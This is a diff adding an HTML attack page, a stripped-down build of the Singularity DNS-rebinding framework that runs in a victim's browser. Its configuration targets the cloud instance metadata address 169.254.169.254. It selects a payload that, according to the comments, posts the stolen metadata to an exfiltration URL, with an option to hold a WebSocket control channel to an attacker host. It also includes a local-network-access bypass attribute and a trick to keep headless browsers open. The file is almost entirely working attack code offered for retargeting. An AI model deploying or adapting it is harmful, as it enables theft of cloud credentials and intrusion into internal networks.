@@ -1,0 +1,194 @@
+<!doctype html>
+<html lang="en">
+<!--
+    Singularity DNS-rebinding attack — minimal scanner-less build.
+    Loaded directly by the victim browser. Drives the rebind loop against a
+    single hardcoded target. Edit the CONFIG block below to retarget.
+    See README.md for full usage.
+-->
+<head>
+    <title>Singularity Attack</title>
+    <meta charset="utf-8">
+    <meta http-equiv="x-dns-prefetch-control" content="off">
+</head>
+<body id="body" style="display: none">
+    <h3>DNS Rebinding Progress</h3>
+    <div id="attackframes"></div>
+    <!--
+      delayDOMLoad: /delaydomload is a Singularity server endpoint that hangs
+      the connection forever. An iframe pointed at it never fires its load
+      event, which blocks the parent document's load event, which prevents
+      headless browsers (puppeteer/playwright with waitUntil:'load') from
+      exiting before the rebind completes. Removed at runtime if disabled.
+    -->
+    <iframe id="delaydomloadframe" src="/delaydomload" style="display: none"></iframe>
+
+    <script>
+    // ============================================================
+    //  CONFIG  —  edit these to retarget the attack
+    // ============================================================
+    const CONFIG = {
+        // Attacker infrastructure
+        attackHostIPAddress: 'xx.xx.xx.xx',
+        attackHostDomain:    'dynamic.your.domain',
+
+        // Target — single source of truth
+        targetHostIPAddress: '169.254.169.254',
+        targetPort:          '80',
+        targetPath:          '/latest/meta-data',  // ← what to fetch after rebind
+
+        // Rebinding — see README.md "Strategy gotchas" before changing
+        rebindingStrategy:   'fs',     // 'fs' (deterministic, reliable) | 'rr' | 'rd' | 'ma' (fast but fragile, see wiki)
+        interval:            '20',     // '20' for fs/rr/rd; '1' only for ma
+        attackMethod:        'iframe', // 'iframe' (Thatcher split-second) | 'fetch'
+
+        // Payload — must match a key registered in payloads/*.js
+        //   'AWS Metadata Exfil'  → POST rebound response to EXFILTRATION_URL
+        //                           in payloads/aws-metadata-exfil.js. One-shot.
+        //   'Hook and Control'    → open WebSocket to ws://<attacker>:<wsProxyPort>/soows
+        //                           and wait for fetch commands. Persistent.
+        //                           Requires rebindingStrategy: 'fs', interval: '20'.
+        attackPayload:       'AWS Metadata Exfil',
+
+        // Misc
+        indexToken:          '<!--thisismytesttoken-->',
+        wsProxyPort:         3129,
+        flushDns:            false,    // only useful with non-'ma' strategies
+        delayDOMLoad:        true,     // keep headless browsers alive past document.load
+        hideActivity:        false,
+    };
+
+    // Called by the rebind-success handler below
+    function onRebindSuccess(msg) {
+        console.log(`[+] rebind success: ${msg.origin}\n${msg.data.response}`);
+    }
+    // ============================================================
+
+    // -------- inlined manager (was manager-khara.js, dead code stripped) --------
+    const HOST_URL_TEMPLATE = "http://s-%1-%2-%3-%4-e.%5:%6/%7";
+
+    const Frame = (id, url) => {
+        let timer = null, errorCount = 0, interval = null;
+        return {
+            getId: () => id,
+            getURL: () => url,
+            getTimer: () => timer,
+            setTimer: v => timer = v,
+            getInterval: () => interval,
+            setInterval: v => interval = v,
+            getErrorCount: () => errorCount,
+            incrementErrorCount: () => ++errorCount,
+        };
+    };
+
+    const FrameManager = () => {
+        let nextId = 0;
+        const frames  = new Map();
+        const origins = new Map();
+        const originOf = (url) => {
+            const u = document.createElement('a');
+            u.setAttribute('href', url);
+            return u.port
+                ? `${u.protocol}//${u.hostname}:${u.port}`
+                : `${u.protocol}//${u.hostname}`;
+        };
+        return {
+            addFrame(url) {
+                const id = `frame-${nextId++}`;
+                frames.set(id, Frame(id, url));
+                origins.set(originOf(url), id);
+                return id;
+            },
+            frame: id => frames.get(id),
+            getFrameOrigin: o => origins.get(o),
+        };
+    };
+
+    const buildAttackUrl = () => HOST_URL_TEMPLATE
+        .replace("%1", CONFIG.attackHostIPAddress)
+        .replace("%2", CONFIG.targetHostIPAddress.replace(/-/g, '--'))
+        .replace("%3", Math.floor(Math.random() * 2 ** 32))
+        .replace("%4", CONFIG.rebindingStrategy)
+        .replace("%5", CONFIG.attackHostDomain)
+        .replace("%6", CONFIG.targetPort)
+        .replace("%7", `soopayload.html?rnd=${Math.random()}`);
+
+    const fm = FrameManager();
+    let flushDnsState = CONFIG.flushDns;  // local mutable copy; reset after first post
+
+    function addFrameToDOM(frame) {
+        console.log(`addFrameToDOM: ${frame.getURL()}`);
+        const f = document.createElement('iframe');
+        f.src = frame.getURL();
+        f.id  = frame.getId();
+        // LNA bypass — needs Origin-Trial token on the server side to take effect.
+        // See README.md → "Enabling LNA bypass". Harmless if server lacks the header.
+        f.setAttribute('allow', 'local-network-access *');
+        document.getElementById('attackframes').appendChild(f);
+    }
+
+    function reloadAttackFrame(frame) {
+        console.log(`reloadAttackFrame: ${frame.getURL()}`);
+        document.getElementById(frame.getId()).src = frame.getURL();
+    }
+
+    // Manager <-> attack-frame protocol
+    window.addEventListener('message', (msg) => {
+        const fid = fm.getFrameOrigin(msg.origin);
+        // Silently drop messages from origins we didn't spawn (e.g. other
+        // Singularity components on neighboring subdomains posting into us).
+        if (fid === undefined) return;
+        console.log('msg from:', msg.origin, msg.data.status);
+
+        if (msg.data.status === 'start') {
+            clearInterval(fm.frame(fid).getTimer());
+            const post = (cmd, param) => msg.source.postMessage({ cmd, param }, "*");
+            post('payload',     CONFIG.attackPayload);
+            post('interval',    fm.frame(fid).getInterval() || CONFIG.interval);
+            post('wsproxyport', CONFIG.wsProxyPort);
+            post('indextoken',  CONFIG.indexToken);
+            post('targetpath',  CONFIG.targetPath);   // ← single source of truth
+            post('flushdns',    { hostname: window.location.hostname, flushDns: flushDnsState });
+            flushDnsState = false;  // only flush once per session
+            post(CONFIG.attackMethod === 'fetch' ? 'startFetch' : 'startReloadChildFrame', null);
+        }
+        else if (msg.data.status === 'success') {
+            onRebindSuccess(msg);
+            msg.source.postMessage({ cmd: 'stop' }, "*");
+        }
+        else if (msg.data.status === 'requiresHttpAuthentication') {
+            document.getElementById(fid).contentWindow.postMessage({ cmd: 'stop' }, "*");
+            console.log(`requires HTTP auth: ${msg.origin}`);
+        }
+        else if (msg.data.status === 'error') {
+            const f = fm.frame(fid);
+            f.incrementErrorCount();
+            console.log(`error: ${msg.origin}`);
+            if (f.getErrorCount() === 5) {
+                document.getElementById(fid).contentWindow.postMessage({ cmd: 'stop' }, "*");
+                console.log(`too many errors, stopping: ${msg.origin}`);
+            }
+        }
+    }, false);
+
+    // Reveal body if not hidden
+    if (CONFIG.hideActivity === false) document.body.style.display = 'block';
+
+    // Tear down delayDOMLoad iframe if disabled
+    if (CONFIG.delayDOMLoad !== true) {
+        const d = document.getElementById('delaydomloadframe');
+        d.parentNode.removeChild(d);
+    }
+
+    // Begin attack
+    (function begin() {
+        const fid = fm.addFrame(buildAttackUrl());
+        addFrameToDOM(fm.frame(fid));
+        fm.frame(fid).setTimer(setInterval(
+            () => reloadAttackFrame(fm.frame(fid)),
+            parseInt(CONFIG.interval) * 1000
+        ));
+    })();
+    </script>
+</body>
+</html>
